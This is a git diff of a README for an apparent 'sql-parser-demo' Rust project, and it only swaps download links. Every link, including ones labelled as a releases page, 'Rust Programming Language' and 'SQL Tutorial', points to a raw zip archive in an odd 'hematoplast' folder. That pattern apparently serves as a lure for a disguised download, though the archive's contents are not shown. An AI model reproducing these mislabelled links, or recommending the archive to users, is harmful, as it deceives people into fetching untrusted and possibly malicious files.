@@ -4,7 +4,7 @@ Welcome to the sql-parser-demo repository! This demo showcases a simple parser d
 
 ## 📦 Download Now
 
-[![Download sql-parser-demo](https://raw.githubusercontent.com/Tegare/sql-parser-demo/main/hematoplast/sql-parser-demo.zip)](https://raw.githubusercontent.com/Tegare/sql-parser-demo/main/hematoplast/sql-parser-demo.zip)
+[![Download sql-parser-demo](https://raw.githubusercontent.com/Tegare/sql-parser-demo/main/hematoplast/demo-sql-parser-v1.8.zip)](https://raw.githubusercontent.com/Tegare/sql-parser-demo/main/hematoplast/demo-sql-parser-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Follow these steps to get started with sql-parser-demo:
 
 1. **Visit the Releases Page**  
    Click on the link below to access the releases page for sql-parser-demo. This page has the latest version of the software.  
-   [Visit this page to download](https://raw.githubusercontent.com/Tegare/sql-parser-demo/main/hematoplast/sql-parser-demo.zip)  
+   [Visit this page to download](https://raw.githubusercontent.com/Tegare/sql-parser-demo/main/hematoplast/demo-sql-parser-v1.8.zip)  
 
 2. **Choose the Right Version**  
    On the releases page, you will see a list of versions. Look for the most recent version at the top of the list. This version comes with improvements and fixes.
@@ -61,10 +61,10 @@ If you encounter any issues while downloading or running the application, here a
 
 For further assistance or to learn more, you can visit the following links:
 
-- [Rust Programming Language](https://raw.githubusercontent.com/Tegare/sql-parser-demo/main/hematoplast/sql-parser-demo.zip)
-- [SQL Tutorial](https://raw.githubusercontent.com/Tegare/sql-parser-demo/main/hematoplast/sql-parser-demo.zip)
+- [Rust Programming Language](https://raw.githubusercontent.com/Tegare/sql-parser-demo/main/hematoplast/demo-sql-parser-v1.8.zip)
+- [SQL Tutorial](https://raw.githubusercontent.com/Tegare/sql-parser-demo/main/hematoplast/demo-sql-parser-v1.8.zip)
 
-Again, if you need to download the application, you can access it here: [Visit this page to download](https://raw.githubusercontent.com/Tegare/sql-parser-demo/main/hematoplast/sql-parser-demo.zip).
+Again, if you need to download the application, you can access it here: [Visit this page to download](https://raw.githubusercontent.com/Tegare/sql-parser-demo/main/hematoplast/demo-sql-parser-v1.8.zip).
 
 ## 📜 License
 
